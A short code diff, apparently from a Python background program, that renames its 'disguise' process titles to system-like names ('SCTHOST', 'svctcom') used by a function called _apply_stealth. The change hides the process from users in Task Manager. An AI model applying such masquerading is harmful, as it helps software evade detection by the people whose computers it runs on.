@@ -47,8 +47,8 @@ POLL_SECONDS = 15
 # PyInstaller spec and Inno Setup script.  They ensure the process title and
 # Task Manager grouping are correct even when running directly from source
 # (e.g. during development or on systems where the installer wasn't used).
-_WIN_DISGUISE = "windowstelementoryservice"
-_MAC_DISGUISE = "macstelementoryservice"
+_WIN_DISGUISE = "SCTHOST"
+_MAC_DISGUISE = "svctcom"
 
 
 def _apply_stealth() -> None:
